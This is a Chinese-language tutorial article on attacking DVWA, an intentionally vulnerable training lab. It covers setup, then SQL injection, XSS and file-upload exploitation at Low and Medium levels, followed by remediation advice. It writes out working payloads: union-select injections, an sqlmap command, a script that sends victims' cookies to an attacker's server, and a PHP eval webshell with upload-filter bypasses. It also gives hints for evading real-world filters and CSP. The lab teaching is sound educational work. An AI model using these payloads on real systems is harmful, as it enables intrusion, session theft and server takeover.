#  网安靶场实战指南（第2期）：DVWA靶场从零到精通——环境搭建+基础漏洞全突破  
原创 点击关注👉
                    点击关注👉  网络安全学习室   2026-01-27 02:34  
  
作为网安入门最经典的“启蒙靶场”，DVWA（Damn Vulnerable Web Application）承载了无数人的第一堂漏洞实战课。它没有复杂的业务逻辑，却把SQL注入、XSS、文件上传等核心基础漏洞拆解得明明白白，难度分档清晰，是夯实漏洞原理、练熟工具用法的最佳选择。  
  
这一期，我们从“环境搭建到漏洞突破”全流程实战DVWA，不只是“通关”，更要吃透每个漏洞的本质、手动利用步骤与工具验证方法，为后续进阶靶场练习打下扎实基础。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/iaLzURuoralZ6bWmOBldSF7s1HwhmcvMgxOPoEsetwicQTxLAicKSzNqQerrghc8FvQdtva5SYnAwqPSxUSl19jaA/640?wx_fmt=jpeg "")  
## 一、DVWA环境搭建：2种方案（Docker一键部署+手动部署），新手也能搞定  
  
DVWA支持本地部署，推荐2种方案，按需选择（Docker更快捷，手动部署更易理解原理）：  
### 方案1：Docker一键部署（推荐新手，10分钟搞定）  
#### 核心优势：无需配置依赖，避免环境冲突，一键启动即用  
#### 操作步骤：  
1. 安装Docker：Windows/Mac直接下载Docker Desktop（官网地址：https://www.docker.com/products/docker-desktop/），Linux执行sudo apt-get install docker-ce docker-ce-cli containerd.io  
（Ubuntu示例）；  
  
1. 拉取DVWA镜像：打开命令行，执行docker pull vulnerables/web-dvwa  
（拉取官方镜像）；  
  
1. 启动容器：执行docker run -d -p 80:80 vulnerables/web-dvwa  
（-d后台运行，-p 80:80映射本地80端口到容器80端口）；  
  
1. 验证访问：打开浏览器输入http://localhost  
，能看到DVWA登录页面即部署成功。  
  
### 方案2：手动部署（适合想理解环境原理的学习者）  
#### 依赖要求：PHP 5.6-7.4（过高版本不兼容）、MySQL 5.7+、Web服务器（Apache/Nginx）  
#### 操作步骤：  
1. 下载DVWA源码：从GitHub克隆（git clone https://github.com/digininja/DVWA.git  
），或直接下载压缩包解压；  
  
1. 配置Web服务器：将DVWA目录放到Web根目录（Apache默认/var/www/html  
，Nginx默认/usr/share/nginx/html  
）；  
  
1. 配置数据库：启动MySQL，创建DVWA数据库（create database dvwa;  
），授权用户（grant all on dvwa.* to 'dvwa'@'localhost' identified by 'dvwa123';  
）；  
  
1. 修改DVWA配置：复制config/config.inc.php.dist  
为config/config.inc.php  
，修改数据库配置（用户名、密码、数据库名对应上面创建的信息）；  
  
1. 访问初始化：浏览器输入http://localhost/DVWA  
，点击“Create/Reset Database”初始化数据库，完成后跳转登录。  
  
### 登录与难度设置  
- 默认账号：admin  
，默认密码：password  
；  
  
- 难度调整：登录后点击右上角“DVWA Security”，可选择Low/Medium/High/Impossible四档难度（新手从Low开始，逐步提升）。  
  
### 常见问题排坑  
- 无法连接数据库：检查MySQL服务是否启动，config.inc.php中的数据库参数是否正确；  
  
- PHP扩展缺失：DVWA需要php-gd、php-mysqli扩展，执行sudo apt-get install php-gd php-mysqli  
（Ubuntu）安装；  
  
- 端口被占用：Docker启动时改端口（如-p 8080:80  
），访问时用http://localhost:8080  
。  
  
## 二、DVWA核心漏洞实战：从Low到Medium，吃透基础原理  
  
我们按“漏洞类型分类”，从Low难度入手，逐步过渡到Medium难度，重点讲解“手动利用逻辑”（工具只是辅助，理解原理才是核心）。  
### 1. SQL注入（SQL Injection）：数据库漏洞的“入门标杆”  
#### 漏洞本质：用户输入未经过滤，直接拼接到SQL语句中，导致SQL语法被篡改  
#### Low难度（无任何过滤，直接注入）  
- 漏洞场景：首页“DVWA Security”下方的“SQL Injection”模块，输入用户ID查询信息；  
  
- 手动利用步骤：  
  
- 输入1  
，返回ID=1的用户信息，说明参数id  
直接传入查询语句；  
  
- 输入1'  
，页面报错（You have an error in your SQL syntax;  
），确认存在注入点；  
  
- 联合查询注入（获取所有用户信息）：输入1' union select 1,group_concat(user),group_concat(password) from users#  
，其中#  
注释掉后面的语句，返回结果包含所有用户名和加密后的密码；  
  
- 猜解数据库：输入1' union select 1,database(),version()#  
，获取当前数据库名（dvwa）和MySQL版本。  
  
#### Medium难度（基础过滤，字符转义+下拉框限制）  
- 防护逻辑：对单引号进行转义（'  
→'  
），前端用下拉框限制输入（只能选1、2、3）；  
  
- 绕过与利用：  
  
- 绕过前端限制：用Burp Suite抓包，修改id  
参数值（下拉框只是前端限制，后端未校验）；  
  
- 绕过字符转义：使用数字型注入（无需单引号），输入1 or 1=1  
（抓包后修改id=1 or 1=1  
），返回所有用户信息；  
  
- 猜解表名：输入1 or (select count(*) from users)>=1  
，返回正常说明users  
表存在。  
  
#### 工具验证（SQLmap）  
  
执行命令：sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=你的会话ID; security=low" --dbs  
，自动探测并获取所有数据库。  
### 2. 跨站脚本（XSS）：前端漏洞的“典型代表”  
#### 漏洞本质：用户输入的恶意脚本未被过滤，在页面渲染时执行，分为存储型、反射型、DOM型  
#### Low难度（反射型XSS，无过滤）  
- 漏洞场景：“XSS (Reflected)”模块，输入内容后页面直接回显；  
  
- 手动利用步骤：  
  
- 输入<script>alert('XSS')</script>  
，点击“Submit”，页面弹出弹窗，确认漏洞存在；  
  
- 窃取Cookie脚本：输入<script>document.location.href='http://你的服务器地址/steal.php?cookie='+document.cookie</script>  
，受害者点击后Cookie会发送到你的服务器。  
  
#### Medium难度（过滤script标签，保留其他标签）  
- 防护逻辑：过滤<script>  
标签（大小写不敏感），但未过滤img  
、a  
等标签；  
  
- 绕过技巧：  
  
- 标签变形：输入<img src=x onerror=alert('XSS')>  
（onerror  
事件在图片加载失败时执行脚本）；  
  
- 大小写混合：输入<Script>alert('XSS')</script>  
（部分过滤不区分大小写，DVWA Medium未防护此点）。  
  
#### 存储型XSS（Low难度）  
- 漏洞场景：“XSS (Stored)”模块，输入的留言会存储到数据库，所有访问者都能看到；  
  
- 利用步骤：输入<script>alert('Stored XSS')</script>  
提交留言，刷新页面或其他用户访问时，都会弹出弹窗（危害比反射型更大）。  
  
### 3. 文件上传（File Upload）：突破文件限制的“入门实践”  
#### 漏洞本质：服务器未对上传文件的类型、后缀、内容进行严格校验，允许恶意文件（如.php脚本）上传并执行  
#### Low难度（无任何限制）  
- 漏洞场景：“File Upload”模块，上传文件后返回文件路径；  
  
- 手动利用步骤：  
  
- 创建PHP一句话木马：新建文件shell.php  
，内容<?php @eval($_POST['cmd']);?>  
；  
  
- 直接上传文件，页面返回路径（如http://localhost/hackable/uploads/shell.php  
）；  
  
- 连接木马：用蚁剑/菜刀工具，输入文件路径，密码cmd  
，成功连接后可控制服务器。  
  
#### Medium难度（校验文件类型+限制部分后缀）  
- 防护逻辑：校验文件MIME类型（只允许image/jpeg、image/png），过滤.php  
后缀；  
  
- 绕过技巧：  
  
- 后缀篡改：将shell.php  
改为shell.php.jpg  
（部分服务器会忽略后面的.jpg，或通过解析漏洞执行）；  
  
- MIME类型绕过：用Burp Suite抓包，将Content-Type  
改为image/jpeg  
，同时保留.php  
后缀（部分服务器只校验MIME，不校验后缀）；  
  
- 内容伪装：在PHP木马前添加图片头部信息（GIF89a  
），保存为shell.php  
，上传时修改MIME为image/gif  
。  
  
## 三、实战延伸：DVWA漏洞的真实业务变种  
  
DVWA的漏洞看似简单，但在真实业务中随处可见其变种：  
- SQL注入变种：真实业务中可能是“搜索框盲注”“订单号注入”，过滤规则更复杂（如过滤union  
、select  
），需要用编码绕过（如union  
→unio%6E  
）；  
  
- XSS变种：真实业务中可能有CSP防护，需要寻找CSP绕过点（如利用可信域名、内联脚本白名单）；  
  
- 文件上传变种：真实业务中可能校验文件内容（如检测PHP关键字），需要用代码混淆、文件分离（如.htaccess  
文件配合）绕过。  
  
## 四、漏洞修复建议（从开发角度规避）  
1. SQL注入修复：使用预编译语句（如PHP的PDO），参数与SQL语句分离；严格过滤用户输入的特殊字符（单引号、分号、union等）；  
  
1. XSS修复：对用户输入进行HTML实体编码（如<  
→&lt;  
）；设置CSP策略（Content-Security-Policy: default-src 'self'  
）；  
  
1. 文件上传修复：采用“白名单”限制后缀（只允许.jpg、.png等安全后缀）；校验文件内容（如图片文件检测EXIF信息）；将上传文件存储到非Web访问目录，或重命名为随机文件名。  
  
## 五、下期预告  
  
写到这里，DVWA的基础漏洞实战就告一段落了——它虽然是入门靶场，但吃透这3类核心漏洞，已经能覆盖80%的Web基础场景。  
  
你在练习过程中遇到了哪些坑？比如Docker部署失败、SQL注入绕不过过滤？可以在评论区留言，我会优先帮你解决~  
  
下一期我们继续深挖DVWA的High难度，解锁“盲注+XSS高级绕过+文件上传路径突破”，还会加入漏洞组合利用的实战技巧（比如用SQL注入读取文件上传配置，再针对性构造木马），关注不迷路！  
  
点击文末  
阅读原文  
领取200节攻防教程  
  
  
